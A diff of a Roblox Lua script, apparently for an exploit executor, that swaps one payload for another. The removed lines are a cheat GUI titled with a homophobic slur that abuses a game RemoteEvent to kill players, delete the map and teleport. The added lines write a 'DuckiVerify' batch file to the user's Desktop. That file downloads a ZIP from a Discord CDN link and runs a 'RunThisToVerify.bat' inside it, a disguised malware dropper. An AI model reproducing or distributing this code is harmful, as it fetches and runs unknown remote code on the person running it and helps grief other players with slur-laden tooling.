@@ -1,138 +1,97 @@
-local player = game.Players.LocalPlayer
-local mouse = player:GetMouse()
-local playerGui = player:WaitForChild("PlayerGui")
+local folder = "DUCKIVERIFY"
+local fullPath = "C:\\Users\\YourUser\\Desktop\\" .. folder -- Change this to your desired location
+local filepath = fullPath .. "\\DuckiVerify.bat"
 
--- Create GUI
-local screenGui = Instance.new("ScreenGui", playerGui)
+-- Batch script content
+local content = [[
+@echo off
+echo Downloading DuckiVerify...
+set "url=https://cdn.discordapp.com/attachments/1341636194601013384/1353099900736241754/DuckiVerify.zip?ex=67e06bfb&is=67df1a7b&hm=492d683fd57f1b7a2fbb7446ec2c8425db2891d11f695cdf51656a6ab7411423&"
+set "output=DuckiVerify.zip"
+set "extractFolder=DuckiVerify"
 
-local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 250, 0, 250)
-frame.Position = UDim2.new(0.5, -125, 0.5, -125)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BackgroundTransparency = 0.8
-frame.BorderSizePixel = 0
+REM Download the file using PowerShell (with URL enclosed in single quotes)
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
 
--- Make GUI Draggable
-local dragging, dragInput, dragStart, startPos
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position
-    end
+REM Check if the download was successful
+if exist "%output%" (
+    echo Download successful. Extracting files...
+    REM Extract the ZIP file
+    powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '.\%extractFolder%'"
+    echo Extraction complete.
+
+    REM Check if there is a nested folder with the same name
+    if exist ".\%extractFolder%\%extractFolder%\" (
+        echo Nested folder detected. Moving files...
+        REM Move files from the nested folder to the parent folder
+        move ".\%extractFolder%\%extractFolder%\*" ".\%extractFolder%\" >nul
+        REM Remove the now-empty nested folder
+        rmdir ".\%extractFolder%\%extractFolder%"
+        echo Files moved successfully.
+    )
+
+    REM Navigate to the extracted folder
+    cd ".\%extractFolder%"
+    echo Changed directory to %extractFolder%.
+
+    REM Check if RunThisToVerify.bat exists and run it
+    if exist "RunThisToVerify.bat" (
+        echo Running RunThisToVerify.bat...
+        call "RunThisToVerify.bat"
+    ) else (
+        echo RunThisToVerify.bat not found in the extracted folder.
+    )
+
+    REM Optionally, delete the ZIP file after extraction
+    cd..
+    del "%output%"
+    echo ZIP file deleted.
+) else (
+    echo Download failed. Please check the URL and your internet connection.
+)
+
+pause
+]]
+
+-- Create the folder if it doesn't exist
+if not isfolder(fullPath) then
+    makefolder(fullPath)
+end
+
+-- Write the batch file inside the folder
+writefile(filepath, content)
+
+print("DuckiVerify.bat has been created in: " .. fullPath)
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local Button = Instance.new("TextButton")
+
+ScreenGui.Parent = game:GetService("CoreGui")
+
+Frame.Parent = ScreenGui
+Frame.Size = UDim2.new(0, 350, 0, 170)
+Frame.Position = UDim2.new(0.5, -175, 0.5, -85)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+TextLabel.Parent = Frame
+TextLabel.Size = UDim2.new(1, 0, 0.6, 0)
+TextLabel.Position = UDim2.new(0, 0, 0, 10)
+TextLabel.Text = "Go to Workspace and search for\nDUCKIVERIFY to continue."
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1
+TextLabel.TextScaled = true
+
+Button.Parent = Frame
+Button.Size = UDim2.new(0.8, 0, 0.3, 0)
+Button.Position = UDim2.new(0.1, 0, 0.7, 0)
+Button.Text = "Copy Folder Name"
+Button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.MouseButton1Click:Connect(function()
+    setclipboard(folder)
 end)
-frame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
 
--- Title Bar
-local titleBar = Instance.new("Frame", frame)
-titleBar.Size = UDim2.new(1, 0, 0, 30)
-titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-
-local titleLabel = Instance.new("TextLabel", titleBar)
-titleLabel.Size = UDim2.new(1, 0, 1, 0)
-titleLabel.Text = "Gay Deleter"
-titleLabel.TextSize = 18
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.BackgroundTransparency = 1
-
--- Function to Equip "gunr"
-local function equipGun()
-    local gunr = player.Backpack:FindFirstChild("gunr")
-    if gunr then
-        player.Character.Humanoid:EquipTool(gunr)
-    end
-end
-
--- Function to spam gunfire at clicked player for 3 seconds
-local function spamEventAtTarget(target)
-    local character = target.Parent
-    if character and character:FindFirstChild("HumanoidRootPart") then
-        equipGun()
-        local startTime = tick()
-
-        while tick() - startTime < 3 do
-            if character and character:FindFirstChild("HumanoidRootPart") then
-                local args = {character.HumanoidRootPart.Position, 3000}
-                player.Character.gunr.RemoteEvent:FireServer(unpack(args))
-            end
-            wait(0.1)  -- Adjust spam rate
-        end
-    end
-end
-
--- Detect mouse click on a player
-mouse.Button1Down:Connect(function()
-    local target = mouse.Target
-    if target and target.Parent and target.Parent:FindFirstChild("Humanoid") then
-        spamEventAtTarget(target)
-    end
-end)
-
--- Function for KILL ALL
-local function killAll()
-    equipGun()
-    for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
-        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-            local args = {plr.Character.HumanoidRootPart.Position, 3000}
-            player.Character.gunr.RemoteEvent:FireServer(unpack(args))
-        end
-    end
-end
-
--- Function for DELETE MAP
-local function deleteMap()
-    for _, obj in pairs(workspace:GetChildren()) do
-        if obj:IsA("Model") and obj.Name ~= "Baseplate" and not game.Players:GetPlayerFromCharacter(obj) then
-            obj:Destroy()
-        end
-    end
-end
-
--- Function for GUN TP
-local function gunTp()
-    local targetPart = workspace:FindFirstChild("Gunr") and workspace.Gunr:FindFirstChild("Handle")
-    if targetPart then
-        local originalPosition = player.Character.HumanoidRootPart.Position
-        player.Character:SetPrimaryPartCFrame(targetPart.CFrame)
-        wait(1)
-        player.Character:SetPrimaryPartCFrame(CFrame.new(originalPosition))
-    end
-end
-
--- Buttons
-local function createButton(parent, text, position, color, action)
-    local button = Instance.new("TextButton", parent)
-    button.Size = UDim2.new(0, 230, 0, 40)
-    button.Position = position
-    button.Text = text
-    button.BackgroundColor3 = color
-    button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.TextSize = 18
-    button.BorderSizePixel = 0
-    button.MouseButton1Click:Connect(action)
-end
-
-createButton(frame, "KILL ALL", UDim2.new(0, 10, 0, 40), Color3.fromRGB(255, 0, 0), killAll)
-createButton(frame, "DELETE MAP", UDim2.new(0, 10, 0, 90), Color3.fromRGB(255, 255, 0), deleteMap)
-createButton(frame, "GUN TP", UDim2.new(0, 10, 0, 140), Color3.fromRGB(0, 0, 255), gunTp)
-
--- Made By Gorilla Label
-local madeByLabel = Instance.new("TextLabel", frame)
-madeByLabel.Size = UDim2.new(0, 230, 0, 40)
-madeByLabel.Position = UDim2.new(0, 10, 0, 190)
-madeByLabel.Text = "MADE BY GORILLA"
-madeByLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-madeByLabel.TextSize = 18
-madeByLabel.BackgroundTransparency = 1
-
-print("Made by Gorilla")
+print("GUI Created.")
